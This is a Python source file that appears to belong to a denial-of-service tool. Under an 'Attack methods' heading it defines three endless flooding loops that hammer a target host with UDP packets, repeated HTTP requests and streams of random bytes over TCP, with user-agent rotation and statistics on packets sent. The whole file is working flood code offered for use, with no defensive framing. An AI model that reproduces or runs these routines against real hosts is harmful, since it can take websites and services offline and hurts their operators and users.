import socket
import threading
import time
import random
import urllib.request
from os import urandom as randbytes
from context import Context
from statistics import show_statistics
from common import get_random_string, get_server_ip_error_msg
import services

_ctx = Context()


###############################################
# Attack methods
###############################################
def down_it_udp(_ctx: Context):
    i = 1
    while True:
        extra_data = get_random_string(1, _ctx.max_random_packet_len) if _ctx.random_packet_len else ''
        packet = f'GET / HTTP/1.1' \
                 f'\nHost: {_ctx.host}' \
                 f'\n\n User-Agent: {random.choice(_ctx.user_agents)}' \
                 f'\n{_ctx.base_headers[0]}' \
                 f'\n\n{extra_data}'.encode('utf-8')
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        try:
            sock.sendto(packet, (_ctx.host, _ctx.port))
        except socket.gaierror:
            if get_server_ip_error_msg not in _ctx.errors:
                _ctx.errors.append(str(get_server_ip_error_msg))
        else:
            if get_server_ip_error_msg in _ctx.errors:
                _ctx.errors.remove(str(get_server_ip_error_msg))
            _ctx.packets_sent += 1
        sock.close()

        if _ctx.port:
            i += 1
            if i == 50:
                i = 1
                thread = threading.Thread(target=services.connect_host, args=[_ctx])
                thread.daemon = True
                thread.start()

        show_statistics(_ctx)
        time.sleep(.01)


def down_it_http(_ctx: Context):
    while True:
        http_headers = _ctx.headers
        http_headers['User-Agent'] = random.choice(_ctx.user_agents).strip()

        try:
            res = urllib.request.urlopen(
                urllib.request.Request(_ctx.url, headers=http_headers))
            _ctx.http_codes_counter[res.status] += 1
        except Exception as e:
            try:
                _ctx.http_codes_counter[e.status] += 1
            except:
                pass
            _ctx.connections_failed += 1
        else:
            _ctx.connections_success += 1

        _ctx.packets_sent += 1
        show_statistics(_ctx)
        time.sleep(.01)


def down_it_tcp(_ctx: Context):
    """TCP flood."""
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.SOL_TCP)
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            sock.settimeout(5)
            sock.connect((_ctx.host, _ctx.port))
            _ctx.connections_success += 1
            while True:
                try:
                    bytes_to_send_len = _ctx.max_random_packet_len if _ctx.random_packet_len else 1024
                    bytes_to_send = randbytes(_ctx.max_random_packet_len)
                    sock.send(bytes_to_send)
                    time.sleep(.01)
                except:
                    sock.close()
                    break
                else:
                    _ctx.packets_sent += bytes_to_send_len
                    show_statistics(_ctx)
        except:
            _ctx.connections_failed += 1
            show_statistics(_ctx)

        time.sleep(.01)